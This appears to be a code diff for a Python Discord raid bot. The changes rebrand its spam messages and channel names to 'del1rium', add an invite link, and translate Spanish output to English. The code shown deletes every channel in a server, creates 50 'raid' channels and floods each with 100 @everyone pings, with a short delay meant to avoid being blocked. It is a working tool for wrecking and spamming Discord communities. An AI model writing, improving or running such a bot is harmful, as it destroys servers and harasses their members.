@@ -21,7 +21,7 @@ async def spam_pings(channel):
     """Envía ráfagas de pings en un canal específico"""
     for _ in range(100):
         try:
-            await channel.send("@everyone RAID BY MANUS BOT 🚀")
+            await channel.send("@everyone raid by del1rium https://discord.gg/cJJJWHfnn2")
             # Delay mínimo para no ser bloqueado instantáneamente pero mantener velocidad
             await asyncio.sleep(0.1)
         except:
@@ -34,7 +34,7 @@ async def nuke(ctx):
     Comando Ultra-Rápido: Borra todo, crea 50 canales y hace 100 pings en cada uno.
     """
     guild = ctx.guild
-    print(f"Iniciando Nuke en {guild.name}")
+    print(f"Starting Nuke in {guild.name}")
 
     # 1. Borrar todos los canales existentes en paralelo
     delete_tasks = [channel.delete() for channel in guild.channels]
@@ -43,7 +43,7 @@ async def nuke(ctx):
     # 2. Crear 50 canales nuevos y empezar el spam inmediatamente en cada uno
     async def create_and_spam(i):
         try:
-            channel = await guild.create_text_channel(f'raid-manus-{i+1}')
+            channel = await guild.create_text_channel(f'raid-by-del1rium-{i+1}')
             await spam_pings(channel)
         except:
             pass
@@ -55,7 +55,7 @@ async def nuke(ctx):
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
-        await ctx.send("❌ Necesitas permisos de administrador.")
+        await ctx.send("You need administrator permissions")
     else:
         print(f"Error: {error}")
 
